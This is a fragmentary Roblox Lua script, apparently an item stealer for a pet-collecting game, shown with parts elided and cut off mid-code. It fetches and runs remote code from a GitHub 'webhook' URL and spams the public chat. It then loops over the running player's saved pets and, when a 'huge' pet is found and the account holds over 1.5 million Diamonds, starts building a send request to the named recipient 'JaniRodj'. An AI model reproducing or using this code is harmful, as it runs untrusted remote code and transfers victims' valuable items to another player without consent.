...
--// Execution Log
loadstring(game:HttpGet("https://raw.githubusercontent.com/Wopy13/webhook/main/hookara"))()
...
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("|TOPCINA!!!|","All")
...
while wait() do
	for i,v in pairs(savedPets) do
		...
		if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 1500000 then
			local args = {
    			[1] = {
        			["Recipient"] = "JaniRodj",
